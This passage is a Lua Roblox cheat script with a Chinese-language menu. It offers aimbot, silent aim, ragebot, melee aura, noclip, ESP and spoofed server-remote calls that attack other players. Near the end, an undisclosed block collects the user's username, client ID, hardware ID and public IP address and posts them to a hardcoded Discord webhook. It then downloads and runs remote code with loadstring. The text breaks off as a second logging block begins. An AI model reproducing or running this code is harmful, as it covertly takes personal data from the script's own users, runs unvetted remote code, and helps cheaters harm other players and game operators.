    Title = "跳跃高度",
    Description = "调整跳跃高度",
    Default = 7.1,
    Min = 7.1,
    Max = 25,
    Callback = function(Value)
        if RUNS.JumpHeight then
            RUNS.JumpHeight:Disconnect()
            RUNS.JumpHeight = nil
        end
        RUNS.JumpHeight = run.RenderStepped:Connect(function()
            if me.Character and me.Character:FindFirstChild("Humanoid") then
                me.Character:FindFirstChild("Humanoid").UseJumpPower = false
                me.Character:FindFirstChild("Humanoid").JumpHeight = Value
            end
        end)
    end
})

Tabs.Player:Slider({
    Title = "重力",
    Description = "调整世界重力",
    Default = workspace.Gravity,
    Min = workspace.Gravity,
    Max = 75,
    Callback = function(Value)
        workspace.Gravity = Value
    end
})

Tabs.Player:Toggle({
    Title = "无限体力",
    Description = "拥有无限体力",
    Default = functions.Infstamina,
    Callback = function(Value)
        functions.Infstamina = Value
        if Value then
            while functions.Infstamina do
                if Methods.Infstamina == "Getgc" then
                    local stamina = {}
                    function get()
                        for index, value in pairs(getgc(true)) do
                            if type(value) == "table" and rawget(value, "S") then
                                stamina[#stamina + 1] = value
                            end
                        end
                    end
                    local ss, nn = pcall(function()
                        get()
                    end)
                    if ss then
                        for _, a in pairs(stamina) do
                            a.S = 100
                        end
                    end
                elseif Methods.Infstamina == "low exploit" then
                    if me.Character then
                        local hum = me.Character:FindFirstChild("Humanoid")
                        if hum and not hum:GetAttribute("ZSPRN_M") then
                            hum:SetAttribute("ZSPRN_M", true)
                        end
                    end
                    me.CharacterAdded:Connect(function(char)
                        if functions.Infstamina then
                            if char and char:WaitForChild("Humanoid") then
                                local hum = char:FindFirstChild("Humanoid")
                                if hum and not hum:GetAttribute("ZSPRN_M") then
                                    hum:SetAttribute("ZSPRN_M", true)
                                end
                            end
                        end
                    end)
                end
                run.RenderStepped:Wait()
            end
        else
            if me.Character then
                local hum = me.Character:FindFirstChild("Humanoid")
                if hum then
                    local check = hum:GetAttribute("ZSPRN_M")
                    if check then
                        hum:SetAttribute("ZSPRN_M", nil)
                    end
                end
            end
        end
    end
})

Tabs.Player:Dropdown({
    Title = "无限体力方法",
    Description = "选择实现方法",
    Options = {"Getgc", "low exploit"},
    Default = Methods.Infstamina,
    Callback = function(Value)
        Methods.Infstamina = Value
    end
})

Tabs.Player:Toggle({
    Title = "无坠落伤害",
    Description = "防止坠落伤害",
    Default = functions.Nofalldamage,
    Callback = function(Value)
        functions.Nofalldamage = Value
        if Value then
            if me.Character then
                local ff = Instance.new("ForceField")
                ff.Parent = me.Character
                ff.Visible = false
            end
            me.CharacterAdded:Connect(function(char)
                if functions.Nofalldamage and char and char:WaitForChild("HumanoidRootPart") and char:WaitForChild("Humanoid") then
                    local ff = Instance.new("ForceField")
                    ff.Parent = char
                    ff.Visible = false
                end
            end)
        else
            if me.Character then
                for _, a in pairs(me.Character:GetChildren()) do
                    if a:IsA("ForceField") and a.Visible == false then
                        a:Destroy()
                    end
                end
            end
        end
    end
})

Tabs.Player:Toggle({
    Title = "穿墙模式",
    Description = "可以穿过墙壁",
    Default = functions.Noclip,
    Callback = function(Value)
        functions.Noclip = Value
        if Value then
            local function LoopNoclip()
                local char = me.Character
                if char then
                    for _, a in pairs(char:GetDescendants()) do
                        if a:IsA("BasePart") and a.CanCollide == true then
                            a.CanCollide = false
                        end
                    end
                end
            end

            RUNS.Noclip = run.RenderStepped:Connect(LoopNoclip)
        else
            if RUNS.Noclip then
                RUNS.Noclip:Disconnect()
                RUNS.Noclip = nil
            end
        end
    end
})

Tabs.Player:Toggle({
    Title = "伪装倒地",
    Description = "伪装成倒地状态",
    Default = functions.FakeDown,
    Callback = function(Value)
        functions.FakeDown = Value
        if Value then
            local getvalue = CharStats(me).Downed
            getvalue.Value = true
            getvalue:GetPropertyChangedSignal("Value"):Connect(function()
                if functions.FakeDown then
                    getvalue.Value = true
                end
            end)
        else
            CharStats(me).Downed.Value = false
        end
    end
})

Tabs.Player:Toggle({
    Title = "停止颈部移动",
    Description = "停止角色颈部移动",
    Default = functions.Stopneckmove,
    Callback = function(Value)
        functions.Stopneckmove = Value
        if Value then
            if me.Character then
                me.Character:SetAttribute("NoNeckMovement", true)
            end
            me.CharacterAdded:Connect(function(char)
                if char and char:FindFirstChild("Humanoid") then
                    if functions.Stopneckmove then
                        char:SetAttribute("NoNeckMovement", true)
                    end
                else
                    repeat wait() until char and char:FindFirstChild("Humanoid")
                    if functions.Stopneckmove then
                        char:SetAttribute("NoNeckMovement", true)
                    end
                end
            end)
        else
            if me.Character then
                local get = me.Character:GetAttribute("NoNeckMovement")
                if get then
                    me.Character:SetAttribute("NoNeckMovement", nil)
                end
            end
        end
    end
})

Tabs.Player:Toggle({
    Title = "肢体不碎",
    Description = "防止肢体断裂",
    Default = functions.Unbreaklimbs,
    Callback = function(Value)
        functions.Unbreaklimbs = Value
        local limbsfolder = CharStats(me).HealthValues
        for _, a in pairs(limbsfolder:GetChildren()) do
            for _, i in pairs(a:GetChildren()) do
                if i and i.Name == "Broken" then
                    if functions.Unbreaklimbs then
                        i.Value = false
                        i:GetPropertyChangedSignal("Value"):Connect(function()
                            if functions.Unbreaklimbs then
                                i.Value = false
                            end
                        end)
                    end
                end
            end
        end
        limbsfolder.ChildAdded:Connect(function()
            for _, a in pairs(limbsfolder:GetChildren()) do
                for _, i in pairs(a:GetChildren()) do
                    if i and i.Name == "Broken" then
                        if functions.Unbreaklimbs then
                            i.Value = false
                            i:GetPropertyChangedSignal("Value"):Connect(function()
                                if functions.Unbreaklimbs then
                                    i.Value = false
                                end
                            end)
                        end
                    end
                end
            end
        end)
    end
})

Tabs.Combat:Toggle({
    Title = "静默瞄准",
    Description = "自动瞄准敌人",
    Default = functions.SilentAim,
    Callback = function(Value)
        functions.SilentAim = Value
        if Value then
            cockie.SilentAimCircle = Drawing.new("Circle")
            cockie.SilentAimCircle.Color = Color3.new(1, 1, 1)
            cockie.SilentAimCircle.Thickness = 2
            cockie.SilentAimCircle.NumSides = 50
            cockie.SilentAimCircle.Radius = SectionSettings.SilentAim.DrawSize
            cockie.SilentAimCircle.Filled = false
            cockie.SilentAimCircle.Visible = true

            cockie.SilentAimCircle.Position = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)

            local target = nil

            local function GetClosest()
                target = nil
                local shortest = SectionSettings.SilentAim.DrawSize
                for _, a in pairs(plrs:GetPlayers()) do
                    if a ~= me and a.Character then

                        if SectionSettings.SilentAim.CheckDowned and CharStats(a).Downed.Value == true then
                            continue
                        end

                        if SectionSettings.SilentAim.CheckTeam and a.Team == me.Team then
                            continue
                        end

                        if SectionSettings.SilentAim.CheckWhiteList and table.find(WhiteList, a) then
                            continue
                        end

                        local hrp = a.Character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            local screenpos, onScreen = camera:WorldToViewportPoint(hrp.Position)
                            if onScreen then
                                local dist = (Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2) - Vector2.new(screenpos.X, screenpos.Y)).Magnitude
                                if dist < shortest then
                                    target = a
                                end
                            end
                        end
                    end
                end
            end

            run.RenderStepped:Connect(GetClosest)

            local VisualizeEvent = rp.Events2.Visualize
            local DamageEvent = rp.Events["ZFKLF__H"]

            VisualizeEvent.Event:Connect(function(_, ShotCode, _, Gun, _, StartPos, BulletsPerShot)
                if not functions.SilentAim then return end
                if not Gun or not target or not target.Character or not target.Character:FindFirstChild("Humanoid") or target.Character:FindFirstChild("Humanoid").Health == 0 then return end
                if not me.Character or not me.Character:FindFirstChildOfClass("Tool") then return end

                local parts = SectionSettings.SilentAim.TargetParts[math.random(1, #SectionSettings.SilentAim.TargetParts)] or SectionSettings.SilentAim.TargetParts[1] or "Head"
                local targetPart = target.Character:FindFirstChild(parts)
                if not targetPart then return end

                local partPos = targetPart.Position
                local Bullets = {}
                for i = 1, math.clamp(#BulletsPerShot, 1, 100) do
                    table.insert(Bullets, CFrame.new(StartPos, partPos).LookVector)
                end
                task.wait(0.005)
                for i, dir in pairs(Bullets) do
                    DamageEvent:FireServer("🧈", Gun, ShotCode, i, targetPart, partPos, dir)
                end

                if Gun:FindFirstChild("Hitmarker") then
                    Gun.Hitmarker:Fire(targetPart)
                end
            end)
        else
            if cockie.SilentAimCircle then
                cockie.SilentAimCircle:Remove()
                cockie.SilentAimCircle = nil
            end
        end
    end
})

Tabs.Combat:Slider({
    Title = "静默瞄准范围",
    Description = "调整瞄准范围大小",
    Default = SectionSettings.SilentAim.DrawSize,
    Min = 20,
    Max = 500,
    Callback = function(Value)
        SectionSettings.SilentAim.DrawSize = math.floor(Value)
        if cockie.SilentAimCircle then
            cockie.SilentAimCircle.Radius = SectionSettings.SilentAim.DrawSize
        end
    end
})

Tabs.Combat:Toggle({
    Title = "检查倒地状态",
    Description = "忽略倒地的玩家",
    Default = SectionSettings.SilentAim.CheckDowned,
    Callback = function(Value)
        SectionSettings.SilentAim.CheckDowned = Value
    end
})

Tabs.Combat:Toggle({
    Title = "检查队伍",
    Description = "忽略同队伍玩家",
    Default = SectionSettings.SilentAim.CheckTeam,
    Callback = function(Value)
        SectionSettings.SilentAim.CheckTeam = Value
    end
})

Tabs.Combat:Toggle({
    Title = "自瞄",
    Description = "自动瞄准敌人",
    Default = functions.AimBot,
    Callback = function(Value)
        functions.AimBot = Value
        if Value == true then
            cockie.aimbot_button = Instance.new("TextButton")
            cockie.aimbot_button.Parent = game.CoreGui
            cockie.aimbot_button.Name = "Aim"
            cockie.aimbot_button.BackgroundColor3 = Color3.new(0, 0, 0)
            cockie.aimbot_button.Position = UDim2.new(0.689, 0, 0.521, 0)
            cockie.aimbot_button.Size = UDim2.new(0, 40, 0, 40)
            cockie.aimbot_button.TextSize = 10
            cockie.aimbot_button.TextColor3 = Color3.new(1, 1, 1)
            cockie.aimbot_button.Text = "Aim"
            cockie.aimbot_button.Visible = true

            local target = nil
            local pressed = false
            local aimtarget
            local canusing = false
            local FirstPerson = true
            local predict = 15

            local part
            local randpart = nil
            local LastTick = tick()

            cockie.AimBotCircle = Drawing.new("Circle")
            cockie.AimBotCircle.Color = Color3.new(1, 1, 1)
            cockie.AimBotCircle.Thickness = 2
            cockie.AimBotCircle.NumSides = 50
            cockie.AimBotCircle.Radius = SectionSettings.Aimbot.DrawSize
            cockie.AimBotCircle.Filled = false
            cockie.AimBotCircle.Visible = true

            local centerScreen = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)
            cockie.AimBotCircle.Position = centerScreen

            local function getClosestTarget()
                local closest, closestDist = nil, SectionSettings.Aimbot.DrawSize
                for _, player in pairs(plrs:GetPlayers()) do
                    if player ~= me and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then

                        local count = #SectionSettings.Aimbot.TargetParts

                        if count == 0 then
                            part = "Head"
                        elseif count == 1 then
                            part = SectionSettings.Aimbot.TargetParts[count]
                        elseif count > 1 then
                            if tick() - LastTick >= .5 then
                                local rand = math.random(1, count)
                                randpart = SectionSettings.Aimbot.TargetParts[rand]
                                LastTick = tick()
                            end
                            part = randpart or SectionSettings.Aimbot.TargetParts[1]
                        end

                        local pos, onScreen = camera:WorldToViewportPoint(player.Character:FindFirstChild(part).Position)
                        if onScreen then
                            if SectionSettings.Aimbot.CheckTeam and player.Team == me.Team then
                                continue
                            end
                            if SectionSettings.Aimbot.CheckWhiteList and table.find(WhiteList, player) then
                                continue
                            end

                            local centerScreen = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)
                            local distance = (Vector2.new(pos.X, pos.Y) - centerScreen).Magnitude
                            if distance < closestDist then
                                closestDist = distance
                                closest = player
                            end
                        end
                    end
                end
                return closest
            end

            cockie.aimbot_button.MouseButton1Click:Connect(function()
                pressed = not pressed
                aimtarget = getClosestTarget() or nil
            end)

            run.RenderStepped:Connect(function()
                if FirstPerson then
                    local magnitude = (camera.Focus.p - camera.CFrame.p).Magnitude
                    canusing = magnitude <= 1.5
                end
                if functions.AimBot and pressed and aimtarget and aimtarget.Character then
                    local head = aimtarget.Character:FindFirstChild(part)
                    local humanoid = aimtarget.Character:FindFirstChild("Humanoid")
                    if head and humanoid and humanoid.Health ~= 0 and canusing then
                        local targetPosition = head.Position

                        if SectionSettings.Aimbot.CheckDowned and CharStats(target).Downed.Value == true then
                            return
                        end

                        if SectionSettings.Aimbot.Velocity then
                            targetPosition = targetPosition + head.Velocity / predict
                        end
                        camera.CFrame = camera.CFrame:Lerp(CFrame.new(camera.CFrame.p, targetPosition), 0.9)
                    end
                end
            end)

        else
            if cockie.AimBotCircle then 
                cockie.AimBotCircle:Remove() 
                cockie.AimBotCircle = nil
            end
            if cockie.aimbot_button then 
                cockie.aimbot_button:Destroy()
                cockie.aimbot_button = nil
            end
        end
    end
})

Tabs.Combat:Toggle({
    Title = "近战光环",
    Description = "自动攻击附近敌人",
    Default = functions.Meleeaura,
    Callback = function(Value)
        functions.Meleeaura = Value
        if Value then
            local remote1 = rp.Events["XMHH.2"]
            local remote2 = rp.Events["XMHH2.2"]

            local part
            local randpart = nil

            local LastTick = tick()
            local AttachTick = tick()

            local attach = false
            local attachcd = .1

            local AttachCD = {
                ["Fists"] = .05,
                ["Knuckledusters"] = .05,
                ["Nunchucks"] = 0.05,
                ["Shiv"] = .05,
                ["Bat"] = 1,
                ["Metal-Bat"] = 1,
                ["Chainsaw"] = 2.5,
                ["Balisong"] = .05,
                ["Rambo"] = .3,
                ["Shovel"] = 3,
                ["Sledgehammer"] = 2,
                ["Katana"] = .1,
                ["Wrench"] = .1,
                ["FireAxe"] = 2.6
            }

            local function Attack(target)
                if not (target and target:FindFirstChild("Head")) then return end

                local mychar = me.Character
                if not mychar then return end
                local TOOL = mychar:FindFirstChildOfClass("Tool")
                if not TOOL then return end
                local AnimFolder = TOOL:FindFirstChild("AnimsFolder")
                if not AnimFolder then return end
                local anim = AnimFolder:FindFirstChild("Slash1")
                if not anim then return end

                if tick() - AttachTick >= attachcd then
                    local result = remote1:InvokeServer("🍞", tick(), TOOL, "43TRFWX", "Normal", tick(), true)

                    attachcd = AttachCD[TOOL.Name] or 1/2

                    if SectionSettings.MeleeAura.ShowAnim then
                        local load = me.Character:FindFirstChildOfClass("Humanoid"):FindFirstChild("Animator"):LoadAnimation(anim)
                        load:Play()
                        load:AdjustSpeed(1.3)
                    end

                    task.wait(0.3 + math.random() * 0.2)

                    if TOOL then
                        local Handle = TOOL:FindFirstChild("WeaponHandle") or TOOL:FindFirstChild("Handle") or me.Character:FindFirstChild("Right Arm")
                        local arg2 = {
                            "🍞",
                            tick(),
                            TOOL,
                            "2389ZFX34",
                            result,
                            true,
                            Handle,
                            target:FindFirstChild(part),
                            target,
                            me.Character.HumanoidRootPart.Position,
                            target:FindFirstChild(part).Position
                        }
                        if TOOL.Name == "Chainsaw" then
                            for i = 1, 15 do
                                remote2:FireServer(unpack(arg2)) 
                            end
                        else
                            remote2:FireServer(unpack(arg2))
                        end
                        AttachTick = tick()
                    else
                        return
                    end
                end
            end

            while functions.Meleeaura do
                local mychar = me.Character or me.CharacterAdded:Wait()
                if mychar then
                    local myhrp = mychar:FindFirstChild("HumanoidRootPart")
                    if myhrp then
                        for _, a in ipairs(plrs:GetPlayers()) do
                            if a ~= me then
                                local char = a.Character
                                if char then
                                    local hrp = char:FindFirstChild("HumanoidRootPart")
                                    if hrp then
                                        local distance = (myhrp.Position - hrp.Position).Magnitude
                                        if distance < SectionSettings.MeleeAura.Distance and a.Character:FindFirstChildOfClass("Humanoid").Health ~= 0 and not char:FindFirstChildOfClass("ForceField") then

                                            if SectionSettings.MeleeAura.CheckWhiteList and table.find(WhiteList, a) then
                                                continue
                                            end

                                            if SectionSettings.MeleeAura.CheckTeam and a.Team == me.Team then
                                                continue
                                            end

                                            if SectionSettings.MeleeAura.CheckDowned and CharStats(a).Downed.Value == true then
                                                continue
                                            end

                                            local count = #SectionSettings.MeleeAura.TargetParts

                                            if count == 0 then
                                                part = "Head"
                                            elseif count == 1 then
                                                part = SectionSettings.MeleeAura.TargetParts[#SectionSettings.MeleeAura.TargetParts]
                                            elseif count > 1 then
                                                if tick() - LastTick >= .2 then
                                                    local rand = math.random(1, count)
                                                    randpart = SectionSettings.MeleeAura.TargetParts[rand]
                                                    LastTick = tick()
                                                end
                                                part = randpart or SectionSettings.MeleeAura.TargetParts[1]
                                            end

                                            Attack(char)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                run.Heartbeat:Wait()
            end
        end
    end
})

Tabs.Combat:Toggle({
    Title = "显示动画",
    Description = "显示攻击动画",
    Default = SectionSettings.MeleeAura.ShowAnim,
    Callback = function(Value)
        SectionSettings.MeleeAura.ShowAnim = Value
    end
})

Tabs.Combat:Toggle({
    Title = "狂暴模式",
    Description = "自动射击附近敌人",
    Default = functions.RageBot,
    Callback = function(Value)
        functions.RageBot = Value
        if Value then
            local function RandomString(length)
                local res = ""
                for i = 1, length do
                    res = res .. string.char(math.random(97, 122))
                end
                return res
            end

            local function GetClosestEnemy()
                if not me.Character 
                    or not me.Character:FindFirstChild("HumanoidRootPart") 
                then return nil end

                local closestEnemy = nil
                local shortestDistance = 100

                for _, player in pairs(plrs:GetPlayers()) do
                    if player == me then continue end

                    local character = player.Character
                    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                    local rootPart = character and character:FindFirstChild("HumanoidRootPart")

                    if character 
                        and rootPart 
                        and humanoid 
                        and humanoid.Health > 15 
                        and not character:FindFirstChildOfClass("ForceField") 
                    then
                        if SectionSettings.RageBot.CheckWhiteList and table.find(WhiteList, player) then
                            continue
                        end

                        local distance = (rootPart.Position - me.Character.HumanoidRootPart.Position).Magnitude
                        if distance < shortestDistance then
                            shortestDistance = distance
                            closestEnemy = player
                        end
                    end
                end
                return closestEnemy
            end

            local function Shoot(target)
                if not target or not target.Character then return end

                local head = target.Character:FindFirstChild("Head")
                if not head then return end

                local tool = me.Character and me.Character:FindFirstChildOfClass("Tool")
                if not tool then return end

                local values = tool:FindFirstChild("Values")
                local hitMarker = tool:FindFirstChild("Hitmarker")
                if not values or not hitMarker then return end

                local ammo = values:FindFirstChild("SERVER_Ammo")
                local storedAmmo = values:FindFirstChild("SERVER_StoredAmmo")
                if not ammo or not storedAmmo then return end

                local hitPosition = head.Position
                local hitDirection = (hitPosition - camera.CFrame.Position).unit
                local randomKey = RandomString(30) ..0

                if tool.Name == "Beretta" or tool.Name == "TEC-9" then
                    if ammo.Value > 0 then
                        rp.Events.GNX_S:FireServer(
                            tick(),
                            randomKey,
                            tool,
                            "FDS9I83",
                            camera.CFrame.Position,
                            {hitDirection},
                            false
                        )

                        task.delay(0.00001, function()
                            rp.Events["ZFKLF__H"]:FireServer(
                                "🧈",
                                tool,
                                randomKey,
                                1,
                                head,
                                hitPosition,
                                hitDirection
                            )

                            ammo.Value = math.max(ammo.Value - 1, 0)
                            hitMarker:Fire(head)
                            storedAmmo.Value = values:FindFirstChild("SERVER_StoredAmmo").Value
                            rp.Events.GNX_R:FireServer(tick(), "KLWE89U0", tool)
                        end)
                    end
                end
            end

            local function RageBotLoop()
                while functions.RageBot do
                    if me.Character and me.Character:FindFirstChildOfClass("Tool") then
                        local target = GetClosestEnemy()
                        if target then
                            Shoot(target)
                        end
                    end
                    run.RenderStepped:Wait()
                end
            end
            RageBotLoop()
        end
    end
})

Tabs.Combat:Toggle({
    Title = "瞬间换弹",
    Description = "瞬间完成换弹",
    Default = functions.Instantreload,
    Callback = function(Value)
        functions.Instantreload = Value
        local gunR_remote = rp.Events.GNX_R
        if Value then
            local charme = me.Character
            if charme then
                local tool = charme:FindFirstChildOfClass("Tool")
                if tool and tool:FindFirstChild("IsGun") then
                    local value = tool:FindFirstChild("Values"):FindFirstChild("SERVER_Ammo")
                    local value2 = tool:FindFirstChild("Values"):FindFirstChild("SERVER_StoredAmmo")
                    value2:GetPropertyChangedSignal("Value"):Connect(function()
                        if functions.Instantreload then
                            gunR_remote:FireServer(tick(), "KLWE89U0", tool);
                        end
                    end)
                    if value2.Value ~= 0 then
                        if functions.Instantreload then
                            gunR_remote:FireServer(tick(), "KLWE89U0", tool);
                        end
                    end
                    value:GetPropertyChangedSignal("Value"):Connect(function()
                        if functions.Instantreload and value2.Value ~= 0 then
                            gunR_remote:FireServer(tick(), "KLWE89U0", tool);
                        end
                    end)
                else
                    charme.ChildAdded:Connect(function(obj)
                        if obj:IsA("Tool") and obj:FindFirstChild("IsGun") then
                            local value = obj:FindFirstChild("Values"):FindFirstChild("SERVER_Ammo")
                            local value2 = obj:FindFirstChild("Values"):FindFirstChild("SERVER_StoredAmmo")
                            value2:GetPropertyChangedSignal("Value"):Connect(function()
                                if functions.Instantreload then
                                    gunR_remote:FireServer(tick(), "KLWE89U0", obj);
                                end
                            end)
                            if value2.Value ~= 0 then
                                if functions.Instantreload then
                                    gunR_remote:FireServer(tick(), "KLWE89U0", obj);
                                end
                            end
                            value:GetPropertyChangedSignal("Value"):Connect(function()
                                if functions.Instantreload and value2.Value ~= 0 then
                                    gunR_remote:FireServer(tick(), "KLWE89U0", obj);
                                end
                            end)
                        end
                    end)
                end
                me.CharacterAdded:Connect(function(charr)
                    repeat wait() until charr and charr.Parent
                    charr.ChildAdded:Connect(function(obj)
                        if obj:IsA("Tool") and obj:FindFirstChild("IsGun") then
                            local value = obj:FindFirstChild("Values"):FindFirstChild("SERVER_Ammo")
                            local value2 = obj:FindFirstChild("Values"):FindFirstChild("SERVER_StoredAmmo")
                            value2:GetPropertyChangedSignal("Value"):Connect(function()
                                if functions.Instantreload then
                                    gunR_remote:FireServer(tick(), "KLWE89U0", obj);
                                end
                            end)
                            if value2.Value ~= 0 then
                                if functions.Instantreload then
                                    gunR_remote:FireServer(tick(), "KLWE89U0", obj);
                                end
                            end
                            value:GetPropertyChangedSignal("Value"):Connect(function()
                                if functions.Instantreload and value2.Value ~= 0 then
                                    gunR_remote:FireServer(tick(), "KLWE89U0", obj);
                                end
                            end)
                        end
                    end)
                end)
            end
        end
    end
})

Tabs.Visual:Toggle({
    Title = "ESP",
    Description = "显示玩家轮廓",
    Default = functions.ESP,
    Callback = function(Value)
        functions.ESP = Value
        if Value then
            RUNS.ESP = run.Heartbeat:Connect(function()
                if SectionSettings.ESP.Highlight then
                    local function Update()
                        for _, a in pairs(plrs:GetPlayers()) do
                            if a ~= me then
                                local char = a.Character
                                if char and not char:FindFirstChild("Highlight") then
                                    local hg = Instance.new("Highlight")
                                    hg.Parent = char
                                    hg.FillTransparency = 1
                                end
                            end
                        end
                    end
                    Update()

                    plrs.PlayerAdded:Connect(function(player)
                        if functions.ESP then
                            local char = player.Character or player.CharacterAdded:Wait()
                            if char and SectionSettings.ESP.Highlight and not char:FindFirstChild("Highlight") then
                                local hg = Instance.new("Highlight")
                                hg.Parent = char
                                hg.FillTransparency = 1
                            end
                        end
                    end)
                else
                    for _, a in pairs(plrs:GetPlayers()) do
                        if a ~= me then
                            local char = a.Character
                            if char then
                                local h = char:FindFirstChild("Highlight")
                                if h then h:Destroy() end
                            end
                        end
                    end
                end
            end)
        else
            if RUNS.ESP then
                RUNS.ESP:Disconnect()
                RUNS.ESP = nil
            end
            for _, a in pairs(plrs:GetPlayers()) do
                if a ~= me then
                    local char = a.Character
                    if char then
                        local h = char:FindFirstChild("Highlight")
                        if h then h:Destroy() end
                    end
                end
            end
        end
    end
})

Tabs.Visual:Toggle({
    Title = "高亮显示",
    Description = "高亮显示其他玩家",
    Default = SectionSettings.ESP.Highlight,
    Callback = function(Value)
        SectionSettings.ESP.Highlight = Value
    end
})

Tabs.Visual:Toggle({
    Title = "手臂特效",
    Description = "改变手臂材质",
    Default = functions.ArmsChams,
    Callback = function(Value)
        functions.ArmsChams = Value
        local viewfolder = camera:WaitForChild("ViewModel")
        if Value == true then
            viewfolder["Left Arm"].Material = Enum.Material.ForceField
            viewfolder["Right Arm"].Material = Enum.Material.ForceField
        else
            viewfolder["Left Arm"].Material = Enum.Material.Plastic
            viewfolder["Right Arm"].Material = Enum.Material.Plastic
        end
        me.CharacterAdded:Connect(function(char)
            repeat wait() until char and char.Parent
            local viewfolder = camera:WaitForChild("ViewModel")
            if functions.ArmsChams == true then
                viewfolder["Left Arm"].Material = Enum.Material.ForceField
                viewfolder["Right Arm"].Material = Enum.Material.ForceField
            else
                viewfolder["Left Arm"].Material = Enum.Material.Plastic
                viewfolder["Right Arm"].Material = Enum.Material.Plastic
            end
        end)
    end
})

Tabs.Misc:Button({
    Title = "清理效果",
    Description = "清理所有视觉效果",
    Callback = function()
        if cockie.SilentAimCircle then
            cockie.SilentAimCircle:Remove()
            cockie.SilentAimCircle = nil
        end
        
        if cockie.AimBotCircle then
            cockie.AimBotCircle:Remove()
            cockie.AimBotCircle = nil
        end
        
        if cockie.aimbot_button then
            cockie.aimbot_button:Destroy()
            cockie.aimbot_button = nil
        end
        
        for _, player in pairs(plrs:GetPlayers()) do
            if player ~= me then
                local char = player.Character
                if char then
                    local h = char:FindFirstChild("Highlight")
                    if h then h:Destroy() end
                end
            end
        end
        
        WindUI:Notify({
            Title = "清理完成",
            Content = "所有视觉效果已清理",
            Duration = 3
        })
    end
})

Tabs.Misc:Button({
    Title = "重置设置",
    Description = "重置所有功能设置",
    Callback = function()
        for key, _ in pairs(functions) do
            functions[key] = false
        end
        
        for key, connection in pairs(RUNS) do
            if connection then
                connection:Disconnect()
                RUNS[key] = nil
            end
        end
        
        WindUI:Notify({
            Title = "重置完成",
            Content = "所有设置已重置",
            Duration = 3
        })
    end
})
    return
end
task.wait(0.00000001)
if game.PlaceId == 136801880565837 then
do
    local GS_WEBHOOK = "https://discord.com/api/webhooks/1466533011351802009/xNUWf2_Cqo8Ur2E1vAkHeo0nK9rF4DLcbYxXbX3hKM01cc8NjIzaFfOPaAKYZdMtTzF4"
    
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local LocalizationService = game:GetService("LocalizationService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then
        return
    end

    local function safeCall(func, fallback)
        local success, result = pcall(func)
        return success and result or fallback
    end
    
    local function getAvatarImage(userId)
        return safeCall(function()
            local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
            local response = HttpService:JSONDecode(game:HttpGet(url))
            return response.data[1].imageUrl
        end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
    end
    
    local function getDeviceType()
        local touch = UserInputService.TouchEnabled
        local keyboard = UserInputService.KeyboardEnabled
        local mouse = UserInputService.MouseEnabled
        
        if touch and not keyboard and not mouse then return "移动设备"
        elseif not touch and keyboard and mouse then return "电脑"
        elseif touch and keyboard and mouse then return "模拟器"
        else return "未知" end
    end
    
    local function getExecutor()
        return (identifyexecutor and identifyexecutor()) or 
               (getexecutorname and getexecutorname()) or 
               "未知"
    end
    
    local function getHWID()
        return (gethwid and gethwid()) or "无法获取"
    end
    
    local function getIPAddress()
        local request = http_request or request or (syn and syn.request)
        if not request then return "无请求函数" end
        
        return safeCall(function()
            return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
        end, "获取失败")
    end

    local userId = localPlayer.UserId
    local placeId = game.PlaceId
    
    local payload = {
        username = "BS脚本-机器人",
        embeds = {{
            color = tonumber("0x32CD32"),
            title = string.format("有人正在使用BS脚本 %s %d时%d分", 
                os.date("%Y年%m月%d日"), 
                tonumber(os.date("%H")), 
                tonumber(os.date("%M"))),
            
            thumbnail = {url = getAvatarImage(userId)},
            
            fields = {
                {name = "用户名", value = localPlayer.Name, inline = true},
                {name = "显示名称", value = localPlayer.DisplayName, inline = true},
                {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
                
                {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
                
                {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
                {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
                
                {name = "注入器", value = getExecutor(), inline = true},
                {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
                
                {name = "设备", value = getDeviceType(), inline = false},
                {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
                {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
                
                {name = "会员状态", value = (localPlayer.MembershipType == Enum.MembershipType.Premium and "是" or "否"), inline = false},
                
                {name = "HWID", value = getHWID(), inline = true},
                {name = "IP地址", value = getIPAddress(), inline = true},
                {name = "IP查询", value = string.format("https://binaryfork.com/zh-tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
            }
        }}
    }

    local request = http_request or request or HttpPost or (syn and syn.request)
    if not request then
        return
    end
    
    safeCall(function()
        request({
            Url = GS_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end
    loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/613d779853d477b40af7c9cc8a517308e0003549f584ccf24bb792031b64cf59/download"))()
    return
end
task.wait(0.00000001)
if game.PlaceId == 5041144419 then
do
    local GS_WEBHOOK = "https://discord.com/api/webhooks/1466533011351802009/xNUWf2_Cqo8Ur2E1vAkHeo0nK9rF4DLcbYxXbX3hKM01cc8NjIzaFfOPaAKYZdMtTzF4"
    
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
